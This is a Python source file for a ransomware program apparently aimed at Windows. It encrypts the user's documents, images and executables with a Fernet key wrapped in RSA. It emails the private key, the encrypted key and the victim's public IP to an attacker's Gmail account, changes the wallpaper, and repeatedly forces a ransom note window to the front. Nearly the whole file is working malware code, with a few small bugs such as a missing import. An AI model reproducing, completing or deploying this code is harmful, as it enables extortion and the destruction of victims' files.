from cryptography.fernet import Fernet
import os
import ctypes
import urllib.request
import requests
import time
import datetime
import subprocess
import win32gui
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pathlib import Path


class RansomWare:
    #use to add files we want to encrypt
    file_exts = ['txt', 'png', 'pdf', 'exe', 'docx']

    def __init__(self):
        self.key = None
        self.crypter = None
        self.public_key = None
        self.sysRoot = os.path.expanduser('~')  # User's home directory
        self.localRoot = Path(self.sysRoot) / 'RansomWare_Files'  # Target directory
        self.publicIP = requests.get('https://api.ipify.org').text.strip()
        self.passphrase = "SecurePassphrase123!"  # Private key passphrase
        
        self.recipient_email = "exemple@gmail.com"  # Replace with your email
        self.sender_email = "exemple@gmail.com"  # Replace with sender's email
        self.sender_password = "password"  # Replace with sender's password
        self.smtp_server = "smtp.gmail.com"
        self.smtp_port = 587

        self.generate_or_load_rsa_keys()

    def generate_or_load_rsa_keys(self):
        """Generate RSA key pair if they don't exist, otherwise load them."""
        private_key_path = Path(self.sysRoot) / 'private.pem'
        public_key_path = Path(self.sysRoot) / 'public.pem'

        if not private_key_path.exists() or not public_key_path.exists():
            print("Generating new RSA key pair...")
            key = RSA.generate(2048)
            with open(private_key_path, 'wb') as priv_file:
                priv_file.write(key.export_key(passphrase=self.passphrase, pkcs=8, protection="scryptAndAES128-CBC"))
            with open(public_key_path, 'wb') as pub_file:
                pub_file.write(key.publickey().export_key())

        # Load the public key
        with open(public_key_path, 'rb') as pub_file:
            self.public_key = RSA.import_key(pub_file.read())

    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def write_key(self):
        """Write the Fernet key to a file."""
        key_path = Path(self.sysRoot) / 'fernet_key.txt'
        with open(key_path, 'wb') as f:
            f.write(self.key)

    def encrypt_fernet_key(self):
        """Encrypt the Fernet key using the RSA public key."""
        key_path = Path(self.sysRoot) / 'fernet_key.txt'
        with open(key_path, 'rb') as fk:
            fernet_key = fk.read()

        # Encrypt the Fernet key with RSA
        public_crypter = PKCS1_OAEP.new(self.public_key)
        enc_fernet_key = public_crypter.encrypt(fernet_key)

        # Save the encrypted key
        with open(key_path, 'wb') as f:
            f.write(enc_fernet_key)

        # Save a copy to the Desktop for demonstration
        email_path = Path(self.sysRoot) / 'Desktop/EMAIL_ME.txt'
        with open(email_path, 'wb') as fa:
            fa.write(enc_fernet_key)

        self.key = enc_fernet_key
        self.crypter = None

    def send_keys_via_email(self):
        """Send the RSA keys and encrypted Fernet key via email."""
        private_key_path = Path(self.sysRoot) / 'private.pem'
        public_key_path = Path(self.sysRoot) / 'public.pem'
        encrypted_key_path = Path(self.sysRoot) / 'fernet_key.txt'

        msg = MIMEMultipart()
        msg['From'] = self.sender_email
        msg['To'] = self.recipient_email
        msg['Subject'] = "Ransomware Keys"

        body = f"Public IP: {self.publicIP}\nAttached are the encrypted keys."
        msg.attach(MIMEText(body, 'plain'))

        for file_path in [private_key_path, public_key_path, encrypted_key_path]:
            with open(file_path, 'rb') as file:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(file.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename={file_path.name}")
                msg.attach(part)

        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.sender_email, self.sender_password)
                server.sendmail(self.sender_email, self.recipient_email, msg.as_string())
                print("> Email sent successfully.")
        except Exception as e:
            print(f"> Failed to send email: {e}")

    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                print(data)
                _data = self.crypter.encrypt(data)
                print('> File encrypted')
                print(_data)
            else:
                _data = self.crypter.decrypt(data)
                print('> File decrypted')
                print(_data)
        with open(file_path, 'wb') as fp:
            fp.write(_data)

    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def crypt_system(self, encrypted=False):
        """Encrypt or decrypt all files in the target directory."""
        for root, dirs, files in os.walk(self.localRoot):
            for file in files:
                file_path = os.path.join(root, file)
                if file.split('.')[-1] in self.file_exts:
                    self.crypt_file(file_path, encrypted=encrypted)

    @staticmethod
    def what_is_bitcoin():
        url = 'https://bitcoin.org'
        webbrowser.open(url)

    def change_desktop_background(self):
        imageUrl = 'https://images.com'
        path = f'{self.sysRoot}/Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            #write your note here
            f.write(f'''
''')
            
    def show_ransom_note(self):
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing')
                pass
            else:
                print('Ransom note is not the top window - kill/create process again') 
                time.sleep(0.1)
                ransom.kill()
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            time.sleep(10)
            count +=1 
            if count == 5:
                break

    def put_me_on_desktop(self):
        print('started')
        while True:
            try:
                print('trying')
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.crypt_system(encrypted=True)
                    break
            except Exception as e:
                print(e)
                pass
            time.sleep(10)
            print('Checking for PUT_ME_ON_DESKTOP.txt')
            

def main():
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcoin()
    rw.ransom_note()
    rw.send_keys_via_email()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted')
    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') # Debugging/Testing
    t2.start()
    print('> RansomWare: Target machine has been un-encrypted')
    print('> RansomWare: Completed')



if __name__ == '__main__':
    main()